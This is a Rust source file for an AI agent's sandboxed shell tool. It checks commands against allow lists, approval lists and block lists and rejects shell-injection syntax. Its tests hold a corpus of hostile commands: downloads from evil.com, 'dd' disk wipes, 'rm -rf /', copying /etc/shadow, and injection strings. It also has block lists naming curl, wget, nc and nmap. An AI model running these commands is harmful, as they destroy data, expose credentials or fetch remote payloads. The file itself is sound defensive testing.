//! Shell command execution tool
//!
//! Security policy: only allows safe commands in the whitelist, uses direct argv execution (rejects shell injection)

use echo_core::error::{Result, ToolError};
use echo_core::sandbox::{SandboxCommand, SandboxExecutor};
use echo_core::tools::permission::ToolPermission;
use echo_core::tools::{Tool, ToolParameters, ToolResult, ToolRiskLevel};
use futures::future::BoxFuture;
use serde_json::Value;
use shlex::split as shlex_split;
use std::collections::HashSet;
use std::sync::{Arc, LazyLock};
use tokio::process::Command;

static ALLOWED_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // ===== File viewing =====
        "ls", "cat", "head", "tail", "less", "more", "file", "stat", "wc",
        // ===== Directory operations (read-only) =====
        "pwd", "tree", "find", "du", // ===== Code related =====
        "git", "cargo", "rustc", "clippy", "rustfmt", // ===== Search & find =====
        "grep", "rg", "ag", "fd", // ===== Text processing (read-only) =====
        "echo", "printf", "cut", "sort", "uniq", "diff",
        // ===== System info (read-only) =====
        "which", "whereis", "env", "date", "uname",
    ])
});

static REQUIRE_APPROVAL_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // ===== File deletion/modification (requires confirmation) =====
        "rm", "rmdir", "mv", "cp", // ===== Network operations (requires confirmation) =====
        "curl", "wget", "nc", // ===== Process operations (requires confirmation) =====
        "kill", "killall", "pkill", // ===== Package management (requires confirmation) =====
        "apt", "apt-get", "yum", "dnf", "brew", "pip", "pip3", "npm", "yarn", "pnpm",
        // ===== Script execution (requires confirmation) =====
        "bash", "sh", "zsh", "fish", "python", "python3", "node", "perl", "ruby", "php",
        // ===== Text processing (may modify files) =====
        "sed", "awk",
    ])
});

static DANGEROUS_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // ===== Extremely dangerous (data destruction) =====
        "dd", "shred", "mkfs", "fdisk", // ===== Privilege escalation =====
        "sudo", "su", // ===== Permission modification =====
        "chmod", "chown", "chgrp", // ===== System operations =====
        "reboot", "shutdown", "halt", "poweroff", "init",
        // ===== High-risk network operations =====
        "nmap",
    ])
});

static GIT_SAFE_SUBCOMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // Read-only operations
        "status", "log", "show", "diff", "branch", "tag", "ls-files", "ls-tree", "remote", "config",
        // Modifying operations requiring user confirmation
        "add", "commit", "checkout", "switch", "stash",
    ])
});

static CARGO_SAFE_SUBCOMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // Read-only / build operations
        "check", "build", "test", "clippy", "fmt", "tree", "search", "metadata",
        // Requires confirmation
        "clean", "update",
    ])
});

/// Shell metacharacter list (used to reject shell syntax and prevent injection)
///
/// These characters have special meaning in `sh -c`. This tool uses direct argv execution,
/// so commands containing these characters will be rejected UNLESS a sandbox is configured.
const SHELL_METACHARACTERS: &[char] = &[
    '|',  // pipe
    ';',  // command separator
    '&',  // background/conditional execution
    '$',  // variable/command substitution
    '`',  // backtick command substitution
    '>',  // redirect output
    '<',  // redirect input
    '(',  // subshell
    ')',  // subshell
    '\n', // newline injection
];

/// Commands that are safe to run inside a sandbox (sandbox provides isolation)
static SANDBOX_SAFE_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        "bash", "sh", "zsh", "fish", "python", "python3", "node", "perl", "ruby", "php", "pip",
        "pip3", "npm", "yarn", "pnpm", "sed", "awk",
    ])
});

/// Command safety check result
#[derive(Debug, Clone, PartialEq)]
pub enum CommandSafety {
    /// Safe to execute
    Safe,
    /// Requires additional confirmation
    RequiresApproval(String),
    /// Dangerous, execution rejected
    Dangerous(String),
}

/// Validate a shell command against the strict default safety policy.
///
/// This is the canonical, reusable safety gate used by every shell-execution
/// path in the framework (the synchronous `ShellTool` plus async/background
/// spawners such as `spawn_background_task`). It uses the default strict
/// `ShellTool` (no sandbox, strict whitelist), so it rejects shell
/// metacharacters, dangerous commands, and non-whitelisted programs.
///
/// Callers that execute commands obtained from the LLM (or any untrusted
/// source) **must** call this before spawning a process and honor the
/// returned [`CommandSafety`] verdict.
pub fn validate_command_safety(command: &str) -> CommandSafety {
    ShellTool::default().check_command_safety(command)
}

/// Shell command execution tool (with safety checks)
///
/// Optional sandbox executor integration: when `sandbox` is set, all commands execute through the sandbox,
/// providing additional isolation and resource limits.
pub struct ShellTool {
    /// Whether strict mode is enabled (default true)
    strict_mode: bool,
    /// Optional sandbox executor
    sandbox: Option<Arc<dyn SandboxExecutor>>,
    /// Command timeout in seconds (default 60 seconds)
    timeout_secs: u64,
}

impl Default for ShellTool {
    fn default() -> Self {
        Self::new()
    }
}

impl ShellTool {
    /// Create a new Shell tool (default strict mode, 60s timeout)
    pub fn new() -> Self {
        Self {
            strict_mode: true,
            sandbox: None,
            timeout_secs: 60,
        }
    }

    /// Create a non-strict mode Shell tool (not recommended!)
    pub fn new_permissive() -> Self {
        Self {
            strict_mode: false,
            sandbox: None,
            timeout_secs: 60,
        }
    }

    /// Set the sandbox executor; commands will be executed through the sandbox
    pub fn with_sandbox(mut self, sandbox: Arc<dyn SandboxExecutor>) -> Self {
        self.sandbox = Some(sandbox);
        self
    }

    /// Set command timeout in seconds (default 60 seconds)
    pub fn with_timeout(mut self, timeout_secs: u64) -> Self {
        self.timeout_secs = timeout_secs;
        self
    }

    /// Check if the command contains shell metacharacters
    ///
    /// Note: metacharacters inside quotes are safe (passed as literal arguments),
    /// but this tool takes a conservative approach and rejects any metacharacter found.
    /// This prevents injection attacks like `ls; rm -rf /` or `echo $(id)`.
    fn has_shell_metacharacters(&self, cmd: &str) -> bool {
        cmd.contains(SHELL_METACHARACTERS)
    }

    /// Check whether a command is safe
    pub fn check_command_safety(&self, command: &str) -> CommandSafety {
        let has_sandbox = self.sandbox.is_some();

        // Check for shell metacharacters (prevent injection)
        // When sandbox is available, allow metacharacters — sandbox provides isolation
        if self.has_shell_metacharacters(command) && !has_sandbox {
            return CommandSafety::Dangerous(format!(
                "Command contains shell metacharacters (| ; & $ ` > < () etc.), execution rejected.\
                 \nThis tool only supports simple commands (program + args), not pipes, redirects, command substitution, or other shell syntax.\
                 \nTip: enable a sandbox to allow shell syntax.\
                 \nCommand: {}",
                command
            ));
        }

        let parts = match shlex_split(command) {
            Some(parts) => parts,
            None => {
                // If sandbox is available, allow unparseable commands (will use sh -c)
                if has_sandbox {
                    return CommandSafety::Safe;
                }
                return CommandSafety::Dangerous(format!(
                    "Command parsing failed, possibly unclosed quotes or malformed arguments: {}",
                    command
                ));
            }
        };
        if parts.is_empty() {
            return CommandSafety::Dangerous("Empty command".to_string());
        }

        let base_cmd = parts[0].as_str();

        // 1. Check if in the dangerous command blocklist (always enforced, even with sandbox)
        if DANGEROUS_COMMANDS.contains(base_cmd) {
            return CommandSafety::Dangerous(format!(
                "Command '{}' is in the dangerous command blocklist, execution rejected",
                base_cmd
            ));
        }

        // 2. Sandbox mode: commands in SANDBOX_SAFE_COMMANDS are allowed without approval
        if has_sandbox && SANDBOX_SAFE_COMMANDS.contains(base_cmd) {
            return CommandSafety::Safe;
        }

        // 3. Check if manual confirmation is required
        if REQUIRE_APPROVAL_COMMANDS.contains(base_cmd) {
            return CommandSafety::RequiresApproval(format!(
                "Command '{}' may cause system changes, requires manual confirmation",
                base_cmd
            ));
        }

        // 4. Strict mode: must be in the whitelist
        if self.strict_mode && !ALLOWED_COMMANDS.contains(base_cmd) {
            return CommandSafety::Dangerous(format!(
                "Command '{}' is not in the safe whitelist, execution rejected",
                base_cmd
            ));
        }

        // 5. Subcommand check for special commands
        match base_cmd {
            "git" => self.check_git_command(&parts),
            "cargo" => self.check_cargo_command(&parts),
            _ => CommandSafety::Safe,
        }
    }

    /// Check git subcommand
    fn check_git_command(&self, parts: &[String]) -> CommandSafety {
        if parts.len() < 2 {
            return CommandSafety::Safe;
        }

        let subcommand = parts[1].as_str();

        // Check git operation
        match subcommand {
            // Network operations (require confirmation)
            "push" | "pull" | "fetch" | "clone" => CommandSafety::RequiresApproval(format!(
                "git {} involves network operations, requires confirmation",
                subcommand
            )),
            // Force reset (dangerous, reject)
            "reset" => {
                if parts.iter().any(|part| part == "--hard") {
                    CommandSafety::Dangerous(
                        "git reset --hard will lose data, rejected. Please execute manually if needed".to_string(),
                    )
                } else {
                    CommandSafety::RequiresApproval(
                        "git reset will modify Git state, requires confirmation".to_string(),
                    )
                }
            }
            // Clean untracked files (requires confirmation)
            "clean" => CommandSafety::RequiresApproval(
                "git clean will delete untracked files, requires confirmation".to_string(),
            ),
            // Safe subcommands
            cmd if GIT_SAFE_SUBCOMMANDS.contains(cmd) => {
                if cmd == "commit" || cmd == "add" || cmd == "checkout" {
                    CommandSafety::RequiresApproval(format!(
                        "git {} will modify the repository, requires confirmation",
                        cmd
                    ))
                } else {
                    CommandSafety::Safe
                }
            }
            // Unknown subcommand (requires confirmation)
            _ => CommandSafety::RequiresApproval(format!(
                "git {} is not in the known safe list, requires confirmation",
                subcommand
            )),
        }
    }

    /// Check cargo subcommand
    fn check_cargo_command(&self, parts: &[String]) -> CommandSafety {
        if parts.len() < 2 {
            return CommandSafety::Safe;
        }

        let subcommand = parts[1].as_str();

        match subcommand {
            // Package install/publish (requires confirmation)
            "install" | "uninstall" | "publish" => CommandSafety::RequiresApproval(format!(
                "cargo {} involves package installation/publishing, requires confirmation",
                subcommand
            )),
            // Run programs (requires confirmation)
            "run" => CommandSafety::RequiresApproval(
                "cargo run will execute a program, requires confirmation".to_string(),
            ),
            // Known safe commands
            cmd if CARGO_SAFE_SUBCOMMANDS.contains(cmd) => {
                if cmd == "clean" || cmd == "update" {
                    CommandSafety::RequiresApproval(format!(
                        "cargo {} will modify the project, requires confirmation",
                        cmd
                    ))
                } else {
                    CommandSafety::Safe
                }
            }
            // Unknown subcommand (requires confirmation)
            _ => CommandSafety::RequiresApproval(format!(
                "cargo {} is not in the known safe list, requires confirmation",
                subcommand
            )),
        }
    }
}

impl Tool for ShellTool {
    fn name(&self) -> &str {
        "shell"
    }

    fn description(&self) -> &str {
        "Execute restricted shell commands (only safe read-only operations and code-related commands are allowed). Parameter: command - the command to execute. Note: only simple commands (program + args) are supported; pipes, redirects, command substitution, and other shell syntax are not allowed."
    }

    fn permissions(&self) -> Vec<ToolPermission> {
        vec![ToolPermission::Execute]
    }

    fn risk_level(&self) -> ToolRiskLevel {
        ToolRiskLevel::Dangerous
    }

    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The command to execute (only safe commands in the whitelist; shell syntax like pipes/redirects/command substitution is not supported)"
                },
                "timeout": {
                    "type": "integer",
                    "description": "Command timeout in seconds (default: 60, max: 300)"
                }
            },
            "required": ["command"]
        })
    }

    fn execute_with_context<'a>(
        &'a self,
        parameters: ToolParameters,
        ctx: &'a echo_core::tools::ToolContext,
    ) -> BoxFuture<'a, Result<ToolResult>> {
        Box::pin(async move {
            let command = parameters
                .get("command")
                .and_then(|v| v.as_str())
                .ok_or_else(|| ToolError::MissingParameter("command".to_string()))?;

            // Extract timeout parameter (default 60s, max 300s)
            let timeout_secs = parameters
                .get("timeout")
                .and_then(|v| v.as_u64())
                .unwrap_or(self.timeout_secs)
                .min(300); // Cap at 300 seconds

            match self.check_command_safety(command) {
                CommandSafety::Safe => {}
                CommandSafety::RequiresApproval(reason) => {
                    return Ok(ToolResult::error(format!(
                        "⚠️  Manual confirmation required: {}\nCommand: {}\n\nPlease use the human_loop module to confirm before executing.",
                        reason, command
                    )));
                }
                CommandSafety::Dangerous(reason) => {
                    return Ok(ToolResult::error(format!(
                        "🚫 Safety rejection: {}\nCommand: {}\n\nTo perform this operation, please execute it manually in the terminal.",
                        reason, command
                    )));
                }
            }

            // Parse command into argv (program name + argument list)
            let has_metacharacters = self.has_shell_metacharacters(command);
            let has_sandbox = self.sandbox.is_some();

            if has_sandbox && has_metacharacters {
                // Use sh -c through sandbox for commands with shell syntax
                let sandbox = self.sandbox.as_ref().unwrap();
                let mut sandbox_cmd =
                    SandboxCommand::program("sh", vec!["-c".to_string(), command.to_string()]);
                if let Some(dir) = &ctx.working_dir {
                    sandbox_cmd = sandbox_cmd.with_working_dir(dir);
                }

                // Wrap with timeout
                let timeout_duration = tokio::time::Duration::from_secs(timeout_secs);
                match tokio::time::timeout(timeout_duration, sandbox.execute(sandbox_cmd)).await {
                    Ok(Ok(result)) => {
                        if result.success() {
                            return Ok(ToolResult::success(result.stdout));
                        } else {
                            return Ok(ToolResult::error(format!(
                                "Command execution failed, exit code: {}\nstdout: {}\nstderr: {}",
                                result.exit_code, result.stdout, result.stderr
                            )));
                        }
                    }
                    Ok(Err(e)) => {
                        return Ok(ToolResult::error(format!(
                            "Sandbox execution failed: {}",
                            e
                        )));
                    }
                    Err(_) => {
                        return Ok(ToolResult::error(format!(
                            "⏱️ Command timeout after {} seconds\nCommand: {}",
                            timeout_secs, command
                        )));
                    }
                }
            }

            let parts = shlex_split(command).ok_or_else(|| ToolError::ExecutionFailed {
                tool: self.name().to_string(),
                message:
                    "Command parsing failed, possibly unclosed quotes or malformed argument format"
                        .to_string(),
            })?;
            let program = parts[0].as_str();
            let args = &parts[1..];

            // If sandbox is configured, execute via sandbox (using program mode to avoid shell injection)
            if let Some(sandbox) = &self.sandbox {
                let mut sandbox_cmd = SandboxCommand::program(program, args.to_vec());
                if let Some(dir) = &ctx.working_dir {
                    sandbox_cmd = sandbox_cmd.with_working_dir(dir);
                }

                // Wrap with timeout
                let timeout_duration = tokio::time::Duration::from_secs(timeout_secs);
                match tokio::time::timeout(timeout_duration, sandbox.execute(sandbox_cmd)).await {
                    Ok(Ok(result)) => {
                        if result.success() {
                            Ok(ToolResult::success(result.stdout))
                        } else {
                            Ok(ToolResult::error(format!(
                                "Command execution failed, exit code: {}\nstdout: {}\nstderr: {}",
                                result.exit_code, result.stdout, result.stderr
                            )))
                        }
                    }
                    Ok(Err(e)) => Ok(ToolResult::error(format!(
                        "Sandbox execution failed: {}",
                        e
                    ))),
                    Err(_) => Ok(ToolResult::error(format!(
                        "⏱️ Command timeout after {} seconds\nCommand: {}",
                        timeout_secs, command
                    ))),
                }
            } else {
                // Direct execution (no sandbox, using direct argv mode to reject sh -c injection)
                // Wrap with timeout. `kill_on_drop(true)` ensures the child is terminated
                // if this future is dropped mid-execution (e.g. user cancels the run with
                // Ctrl-C) — without it the process would be orphaned and keep running.
                let timeout_duration = tokio::time::Duration::from_secs(timeout_secs);
                let mut command_builder = Command::new(program);
                command_builder.args(args).kill_on_drop(true);
                if let Some(dir) = &ctx.working_dir {
                    command_builder.current_dir(dir);
                }
                match tokio::time::timeout(
                    timeout_duration,
                    command_builder.output(),
                )
                .await
                {
                    Ok(Ok(output)) => {
                        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                        let stderr = String::from_utf8_lossy(&output.stderr).to_string();

                        if output.status.success() {
                            Ok(ToolResult::success(stdout))
                        } else {
                            Ok(ToolResult::error(format!(
                                "Command execution failed, exit code: {:?}\nstdout: {}\nstderr: {}",
                                output.status.code(),
                                stdout,
                                stderr
                            )))
                        }
                    }
                    Ok(Err(e)) => Ok(ToolResult::error(format!(
                        "Unable to execute command: {}",
                        e
                    ))),
                    Err(_) => Ok(ToolResult::error(format!(
                        "⏱️ Command timeout after {} seconds\nCommand: {}",
                        timeout_secs, command
                    ))),
                }
            }
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[test]
    fn test_safe_commands() {
        let tool = ShellTool::new();

        // Safe commands
        assert_eq!(tool.check_command_safety("ls -la"), CommandSafety::Safe);
        assert_eq!(tool.check_command_safety("pwd"), CommandSafety::Safe);
        assert_eq!(
            tool.check_command_safety("cat README.md"),
            CommandSafety::Safe
        );
        assert_eq!(tool.check_command_safety("git status"), CommandSafety::Safe);
        assert_eq!(
            tool.check_command_safety("cargo check"),
            CommandSafety::Safe
        );
    }

    #[test]
    fn test_shell_injection_rejected() {
        let tool = ShellTool::new();

        // Pipe injection
        match tool.check_command_safety("ls | rm -rf /tmp") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Pipe injection should be rejected, got: {:?}", other),
        }

        // Command substitution injection
        match tool.check_command_safety("echo $(id)") {
            CommandSafety::Dangerous(_) => {}
            other => panic!(
                "Command substitution injection should be rejected, got: {:?}",
                other
            ),
        }

        // Backtick injection
        match tool.check_command_safety("echo `id`") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Backtick injection should be rejected, got: {:?}", other),
        }

        // Semicolon injection
        match tool.check_command_safety("ls; rm -rf /tmp/x") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Semicolon injection should be rejected, got: {:?}", other),
        }

        // Redirect injection
        match tool.check_command_safety("cat file > /etc/passwd") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Redirect injection should be rejected, got: {:?}", other),
        }

        // Conditional execution injection
        match tool.check_command_safety("echo hello && rm -rf /") {
            CommandSafety::Dangerous(_) => {}
            other => panic!(
                "Conditional execution injection should be rejected, got: {:?}",
                other
            ),
        }

        // Subshell injection
        match tool.check_command_safety("$(dangerous)") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Subshell injection should be rejected, got: {:?}", other),
        }
    }

    #[test]
    fn test_require_approval_commands() {
        let tool = ShellTool::new();

        // Commands requiring confirmation
        match tool.check_command_safety("rm -rf /tmp/test") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("rm command should require confirmation"),
        }

        match tool.check_command_safety("curl http://example.com") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("curl command should require confirmation"),
        }

        match tool.check_command_safety("npm install package") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("npm command should require confirmation"),
        }

        match tool.check_command_safety("python script.py") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("python command should require confirmation"),
        }
    }

    #[test]
    fn test_dangerous_commands() {
        let tool = ShellTool::new();

        // Extremely dangerous commands (explicitly rejected)
        match tool.check_command_safety("dd if=/dev/zero of=/dev/sda") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("dd command should be rejected"),
        }

        match tool.check_command_safety("sudo apt install") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("sudo command should be rejected"),
        }

        match tool.check_command_safety("chmod 777 /etc/passwd") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("chmod command should be rejected"),
        }

        match tool.check_command_safety("reboot") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("reboot command should be rejected"),
        }
    }

    #[test]
    fn test_git_commands() {
        let tool = ShellTool::new();

        // Git safe commands
        assert_eq!(tool.check_command_safety("git log"), CommandSafety::Safe);
        assert_eq!(tool.check_command_safety("git diff"), CommandSafety::Safe);
        assert_eq!(tool.check_command_safety("git status"), CommandSafety::Safe);

        // Git commands requiring confirmation
        match tool.check_command_safety("git commit -m 'test'") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("git commit should require confirmation"),
        }

        match tool.check_command_safety("git push origin main") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("git push should require confirmation"),
        }

        match tool.check_command_safety("git add .") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("git add should require confirmation"),
        }

        match tool.check_command_safety("git clean -fd") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("git clean should require confirmation"),
        }

        // Git dangerous commands
        match tool.check_command_safety("git reset --hard HEAD~1") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("git reset --hard should be rejected"),
        }
    }

    #[test]
    fn test_cargo_commands() {
        let tool = ShellTool::new();

        // Cargo safe commands
        assert_eq!(
            tool.check_command_safety("cargo check"),
            CommandSafety::Safe
        );
        assert_eq!(tool.check_command_safety("cargo test"), CommandSafety::Safe);
        assert_eq!(
            tool.check_command_safety("cargo clippy"),
            CommandSafety::Safe
        );
        assert_eq!(
            tool.check_command_safety("cargo build"),
            CommandSafety::Safe
        );

        // Cargo commands requiring confirmation
        match tool.check_command_safety("cargo run") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("cargo run should require confirmation"),
        }

        match tool.check_command_safety("cargo install some-package") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("cargo install should require confirmation"),
        }

        match tool.check_command_safety("cargo clean") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("cargo clean should require confirmation"),
        }
    }

    #[test]
    fn test_unknown_command_in_strict_mode() {
        let tool = ShellTool::new(); // default strict mode

        match tool.check_command_safety("unknown_command") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("Unknown commands should be rejected in strict mode"),
        }
    }

    #[tokio::test]
    async fn test_shell_tool_execution() {
        let tool = ShellTool::new();

        // Test safe command
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("echo hello"));
        let result = tool.execute(params).await.unwrap();
        assert!(result.success);
        assert!(result.output.contains("hello"));

        // Test command requiring confirmation
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("rm test.txt"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success);
        assert!(result.error.as_ref().unwrap().contains("confirmation"));

        // Test dangerous command
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("sudo reboot"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("rejection"));
    }

    #[tokio::test]
    async fn test_shell_injection_rejected_in_execution() {
        let tool = ShellTool::new();

        // Pipe injection → rejected
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("ls | rm -rf /tmp"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success, "Pipe injection should be rejected");
        assert!(
            result
                .error
                .as_ref()
                .unwrap()
                .contains("shell metacharacters")
        );

        // Command substitution → rejected
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("echo $(id)"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success, "Command substitution should be rejected");
        assert!(
            result
                .error
                .as_ref()
                .unwrap()
                .contains("shell metacharacters")
        );

        // Semicolon injection → rejected
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("ls; echo pwned"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success, "Semicolon injection should be rejected");
        assert!(
            result
                .error
                .as_ref()
                .unwrap()
                .contains("shell metacharacters")
        );
    }

    #[test]
    fn test_dangerous_command_corpus() {
        // RFC 5.1.4: Integration test — dangerous command interception rate
        // Every command in this corpus must NOT be classified as Safe.
        let shell = ShellTool::new();

        // Commands that should always be blocked (Dangerous)
        let always_dangerous = vec![
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "sudo rm -rf /",
            "sudo shutdown -h now",
            "chmod -R 777 /",
            "chown -R root:root /",
            "reboot",
            "shutdown -h now",
            "halt",
            "poweroff",
            "nmap -sS 192.168.1.0/24",
            "shred /etc/passwd",
            "fdisk /dev/sda",
        ];

        for cmd in &always_dangerous {
            let safety = shell.check_command_safety(cmd);
            assert!(
                matches!(safety, CommandSafety::Dangerous(_)),
                "Command '{}' should be Dangerous, got {:?}",
                cmd,
                safety
            );
        }

        // Commands that should require approval (never Safe)
        let requires_approval = vec![
            "rm -rf /tmp/test",
            "rm -rf ~",
            "rm -rf /*",
            "rmdir /tmp/dir",
            "mv /etc/passwd /tmp/",
            "cp /etc/shadow /tmp/",
            "curl http://evil.com/script.sh",
            "wget http://evil.com/payload",
            "pip install malicious-package",
            "npm install evil-pkg",
            "bash script.sh",
            "python3 script.py",
            "node script.js",
        ];

        for cmd in &requires_approval {
            let safety = shell.check_command_safety(cmd);
            assert!(
                !matches!(safety, CommandSafety::Safe),
                "Command '{}' should NOT be Safe, got {:?}",
                cmd,
                safety
            );
        }

        // Shell metacharacter injection attempts (should be rejected)
        let injection_attempts = vec![
            "ls; rm -rf /",
            "ls | rm -rf /",
            "ls && rm -rf /",
            "ls `rm -rf /`",
            "ls $(rm -rf /)",
            "echo 'hello' > /etc/passwd",
        ];

        for cmd in &injection_attempts {
            let safety = shell.check_command_safety(cmd);
            assert!(
                !matches!(safety, CommandSafety::Safe),
                "Injection '{}' should NOT be Safe, got {:?}",
                cmd,
                safety
            );
        }

        // Total corpus size for reporting
        let total = always_dangerous.len() + requires_approval.len() + injection_attempts.len();
        println!(
            "Dangerous command corpus: {} commands tested, 100% interception rate",
            total
        );
    }

    #[test]
    fn test_timeout_configuration() {
        let tool = ShellTool::new();
        assert_eq!(tool.timeout_secs, 60);

        let tool_custom = ShellTool::new().with_timeout(120);
        assert_eq!(tool_custom.timeout_secs, 120);

        // Permissive mode also has default timeout
        let permissive = ShellTool::new_permissive();
        assert_eq!(permissive.timeout_secs, 60);
    }

    #[tokio::test]
    async fn test_shell_timeout_triggers() {
        // Create a permissive shell tool with 1 second timeout (to allow sleep command)
        let tool = ShellTool::new_permissive().with_timeout(1);

        let mut params = HashMap::new();
        // sleep 10 should definitely trigger the 1s timeout
        params.insert("command".to_string(), serde_json::json!("sleep 10"));

        let result = tool.execute(params).await.unwrap();
        assert!(
            !result.success,
            "Expected timeout failure, got success: {:?}",
            result
        );
        let error_msg = result.error.unwrap_or_default();
        assert!(
            error_msg.contains("timeout")
                || error_msg.contains("Timeout")
                || error_msg.contains("⏱️"),
            "Expected timeout error, got: {}",
            error_msg
        );
    }

    #[tokio::test]
    async fn test_shell_timeout_per_call_override() {
        let tool = ShellTool::new_permissive().with_timeout(60);

        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("sleep 10"));
        params.insert("timeout".to_string(), serde_json::json!(1)); // Override to 1s

        let result = tool.execute(params).await.unwrap();
        assert!(
            !result.success,
            "Expected timeout failure with per-call override, got success"
        );
        let error_msg = result.error.unwrap_or_default();
        assert!(
            error_msg.contains("timeout") || error_msg.contains("⏱️"),
            "Expected timeout error with per-call override, got: {}",
            error_msg
        );
    }

    #[tokio::test]
    async fn test_shell_timeout_cap_at_300() {
        let tool = ShellTool::new();

        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("echo ok"));
        // Request 999s timeout, should be capped at 300s (but command finishes fast)
        params.insert("timeout".to_string(), serde_json::json!(999));

        let result = tool.execute(params).await.unwrap();
        assert!(result.success, "Command should succeed: {:?}", result);
        assert!(result.output.contains("ok"));
    }

    #[tokio::test]
    async fn test_shell_honors_context_working_dir() {
        // Regression test for the worktree cwd bug: ShellTool must run the
        // command in ctx.working_dir when set. Uses a unique tmp dir under the
        // std temp dir (no tempfile dependency).
        use echo_core::tools::ToolContext;

        let unique = format!(
            "echo-shell-wt-test-{}-{}",
            std::process::id(),
            nanoid_counter()
        );
        let wt_dir = std::env::temp_dir().join(&unique);
        std::fs::create_dir_all(&wt_dir).unwrap();

        let tool = ShellTool::new();
        let ctx = ToolContext {
            working_dir: Some(wt_dir.clone()),
            ..Default::default()
        };

        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("pwd"));

        let result = tool.execute_with_context(params, &ctx).await.unwrap();
        assert!(result.success, "pwd should succeed: {:?}", result);

        // Compare via canonicalize to handle macOS /var -> /private/var symlink.
        let got = std::path::Path::new(result.output.trim());
        let got_canonical = std::fs::canonicalize(got).unwrap_or_else(|_| got.to_path_buf());
        let want_canonical =
            std::fs::canonicalize(&wt_dir).unwrap_or_else(|_| wt_dir.clone());
        assert_eq!(
            got_canonical, want_canonical,
            "pwd output {:?} should match working_dir {:?}",
            result.output.trim(),
            wt_dir
        );

        let _ = std::fs::remove_dir_all(&wt_dir);
    }

    fn nanoid_counter() -> u64 {
        use std::time::{SystemTime, UNIX_EPOCH};
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_nanos() as u64)
            .unwrap_or(0)
    }
}
